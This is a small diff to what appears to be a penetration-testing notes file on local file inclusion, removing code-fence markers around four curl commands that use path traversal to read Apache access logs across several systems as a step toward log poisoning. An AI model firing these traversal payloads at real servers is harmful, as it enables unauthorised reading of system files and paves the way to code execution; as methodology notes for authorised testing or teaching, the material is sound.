@@ -326,12 +326,10 @@ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x ph
         If command output is returned, allow_url_include is ON.
       - Locate Log Files (For Log Poisoning). Attempt to read standard log paths to confirm read access and path location. 
 
-      ```bash
       curl "http://<target_ip>/index.php?page=../../../../var/log/apache2/access.log" # Debian/Ubuntu Apache
       curl "http://<target_ip>/index.php?page=../../../../var/log/httpd/access_log" # CentOS/RHEL Apache
       curl "http://192.168.1.105/index.php?page=../../../../var/log/access.log" # Lgecy versiosn Apache
       curl "http://target/index.php?page=../../../../xampp/apache/logs/access.log" # Windows XAMPP
-      ```
 
 ### Exploitation
 
